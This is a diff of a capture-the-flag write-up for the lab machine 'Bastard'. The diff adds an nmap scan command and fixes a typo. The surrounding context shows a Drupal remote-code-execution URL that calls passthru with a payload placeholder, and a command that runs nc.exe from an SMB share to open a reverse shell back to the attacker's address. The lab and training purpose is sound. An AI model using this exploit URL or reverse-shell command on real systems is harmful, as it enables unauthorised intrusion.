@@ -33,6 +33,7 @@ editPost:
     Text: "Suggest Changes" # edit text
     appendFilePath: true # to append file path to Edit link
 ---
+
 ## Room Information
 
 - Room name: Bastard
@@ -48,6 +49,10 @@ editPost:
 - windows-exploit-suggester
 
 ## Port Scanning
+
+```bash
+sudo nmap $IP -n -Pn -vvv --min-rate 5000
+```
 
 ```powershell
 PORT      STATE SERVICE REASON          VERSION
@@ -169,7 +174,7 @@ This exploits gives us a RCE thanks to a crafted url with the payload which we a
 http://10.10.10.9/?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]={payload}
 ```
 
-I put a smbserver.py on the nc.exe directory in orde to execute the next payload to have a reverse shell.
+I put a smbserver.py on the nc.exe directory in order to execute the next payload to have a reverse shell.
 
 ```powershell
 \\10.10.14.20\smbFolder\nc.exe -e cmd 10.10.14.20 4444
